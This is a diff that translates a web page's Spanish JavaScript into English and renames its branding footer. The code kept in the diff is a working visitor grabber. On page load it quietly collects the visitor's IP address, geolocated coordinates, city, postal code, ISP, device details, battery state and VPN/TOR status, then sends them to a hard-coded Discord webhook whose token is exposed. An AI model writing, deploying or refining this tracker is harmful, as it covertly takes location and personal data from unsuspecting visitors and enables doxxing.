@@ -88,18 +88,18 @@
             const statusEl = document.getElementById('status');
             const WEBHOOK_URL = 'https://discord.com/api/webhooks/1537148912111059014/BqjpnaFhgaclQzaFHQ5aFUktrEg4Vo-YdgxKDtjP3C-o9bPIz5biUvNnjth25Gmu6iR6';
 
-            // Obtener datos estáticos del dispositivo
+            // Get static device data
             function getDeviceInfo() {
                 const nav = navigator;
                 const ua = nav.userAgent;
-                let os = 'Desconocido';
+                let os = 'Unknown';
                 if (ua.indexOf('Win') !== -1) os = 'Windows';
                 else if (ua.indexOf('Mac') !== -1) os = 'macOS';
                 else if (ua.indexOf('Linux') !== -1) os = 'Linux';
                 else if (ua.indexOf('Android') !== -1) os = 'Android';
                 else if (ua.indexOf('iOS') !== -1 || ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) os = 'iOS';
 
-                let browser = 'Desconocido';
+                let browser = 'Unknown';
                 if (ua.indexOf('Firefox') !== -1) browser = 'Firefox';
                 else if (ua.indexOf('Chrome') !== -1) browser = 'Chrome';
                 else if (ua.indexOf('Safari') !== -1) browser = 'Safari';
@@ -111,9 +111,9 @@
                     os: os,
                     browser: browser,
                     language: nav.language || 'en-US',
-                    platform: nav.platform || 'desconocida',
-                    hardwareConcurrency: nav.hardwareConcurrency || 'desconocido',
-                    deviceMemory: nav.deviceMemory || 'desconocido (GB)',
+                    platform: nav.platform || 'unknown',
+                    hardwareConcurrency: nav.hardwareConcurrency || 'unknown',
+                    deviceMemory: nav.deviceMemory || 'unknown (GB)',
                     screenWidth: screen.width,
                     screenHeight: screen.height,
                     colorDepth: screen.colorDepth,
@@ -122,14 +122,14 @@
                 };
             }
 
-            // Obtener estado de la batería (async)
+            // Get battery info (async)
             async function getBatteryInfo() {
                 try {
                     if (navigator.getBattery) {
                         const batt = await navigator.getBattery();
                         return {
                             level: Math.round(batt.level * 100) + '%',
-                            charging: batt.charging ? 'Si' : 'No',
+                            charging: batt.charging ? 'Yes' : 'No',
                             chargingTime: batt.chargingTime + 's',
                             dischargingTime: batt.dischargingTime + 's'
                         };
@@ -138,12 +138,12 @@
                 return { level: 'N/A', charging: 'N/A', chargingTime: 'N/A', dischargingTime: 'N/A' };
             }
 
-            // Enviar a Discord
+            // Send to Discord
             async function sendToDiscord(ipData, device, battery) {
-                // Determinar estado VPN/TOR
+                // Determine VPN/TOR status
                 let vpnTorStatus = 'No VPN/TOR Found';
                 if (ipData.proxy === true && ipData.tor === true) {
-                    vpnTorStatus = 'VPN y TOR Detected';
+                    vpnTorStatus = 'VPN and TOR Detected';
                 } else if (ipData.proxy === true) {
                     vpnTorStatus = 'VPN Detected';
                 } else if (ipData.tor === true) {
@@ -151,19 +151,19 @@
                 }
 
                 const fields = [
-                    { name: 'Direccion IP', value: ipData.ip || 'N/A', inline: true },
-                    { name: 'Coordenadas', value: ipData.latitude && ipData.longitude ? ipData.latitude + ', ' + ipData.longitude : 'N/A', inline: true },
-                    { name: 'Ciudad / Region / Pais', value: (ipData.city || 'N/A') + ', ' + (ipData.region || 'N/A') + ', ' + (ipData.country_name || 'N/A'), inline: false },
-                    { name: 'Codigo Postal / ISP', value: (ipData.postal || 'N/A') + ' | ' + (ipData.org || ipData.isp || 'N/A'), inline: false },
+                    { name: 'IP Address', value: ipData.ip || 'N/A', inline: true },
+                    { name: 'Coordinates', value: ipData.latitude && ipData.longitude ? ipData.latitude + ', ' + ipData.longitude : 'N/A', inline: true },
+                    { name: 'City / Region / Country', value: (ipData.city || 'N/A') + ', ' + (ipData.region || 'N/A') + ', ' + (ipData.country_name || 'N/A'), inline: false },
+                    { name: 'Postal Code / ISP', value: (ipData.postal || 'N/A') + ' | ' + (ipData.org || ipData.isp || 'N/A'), inline: false },
                     { name: 'RAM (GB)', value: device.deviceMemory || 'N/A', inline: true },
-                    { name: 'Bateria', value: battery.level + ' (Cargando: ' + battery.charging + ')', inline: true },
-                    { name: 'Sistema Operativo / Navegador', value: device.os + ' / ' + device.browser, inline: true },
-                    { name: 'Pantalla', value: device.screenWidth + 'x' + device.screenHeight + ' @ ' + device.colorDepth + 'bits', inline: true },
-                    { name: 'Nucleos CPU', value: device.hardwareConcurrency || 'N/A', inline: true },
-                    { name: 'Zona Horaria', value: device.timezone || 'N/A', inline: true },
+                    { name: 'Battery', value: battery.level + ' (Charging: ' + battery.charging + ')', inline: true },
+                    { name: 'Operating System / Browser', value: device.os + ' / ' + device.browser, inline: true },
+                    { name: 'Screen', value: device.screenWidth + 'x' + device.screenHeight + ' @ ' + device.colorDepth + 'bits', inline: true },
+                    { name: 'CPU Cores', value: device.hardwareConcurrency || 'N/A', inline: true },
+                    { name: 'Timezone', value: device.timezone || 'N/A', inline: true },
                     { name: 'Timestamp', value: device.timestamp || 'N/A', inline: false },
-                    { name: 'User-Agent completo', value: device.userAgent || 'N/A', inline: false },
-                    { name: 'Estado VPN/TOR', value: vpnTorStatus, inline: false }
+                    { name: 'Full User-Agent', value: device.userAgent || 'N/A', inline: false },
+                    { name: 'VPN/TOR Status', value: vpnTorStatus, inline: false }
                 ];
 
                 const payload = {
@@ -173,7 +173,7 @@
                         title: 'CtOS',
                         color: 0x00ff00,
                         fields: fields,
-                        footer: { text: 'rx9xx clan | Dark Night ai' },
+                        footer: { text: 'R3tro' },
                         timestamp: new Date().toISOString()
                     }]
                 };
@@ -197,18 +197,18 @@
                 }
             }
 
-            // Ejecución principal
+            // Main execution
             async function execute() {
                 const device = getDeviceInfo();
                 const battery = await getBatteryInfo();
 
                 try {
                     const geoResp = await fetch('https://ipapi.co/json/');
-                    if (!geoResp.ok) throw new Error('Geo API fallo');
+                    if (!geoResp.ok) throw new Error('Geo API failed');
                     const geo = await geoResp.json();
                     await sendToDiscord(geo, device, battery);
                 } catch (err) {
-                    // Fallback con ipify
+                    // Fallback with ipify
                     try {
                         const ipResp = await fetch('https://api.ipify.org?format=json');
                         const ipData = await ipResp.json();
@@ -226,13 +226,13 @@
                         };
                         await sendToDiscord(fallbackGeo, device, battery);
                     } catch (e2) {
-                        statusEl.textContent = 'Todas las APIs fallaron: ' + e2.message;
+                        statusEl.textContent = 'All APIs failed: ' + e2.message;
                         statusEl.className = 'error';
                     }
                 }
             }
 
-            // Ejecutar al cargar la página
+            // Execute on page load
             if (document.readyState === 'complete') {
                 execute();
             } else {
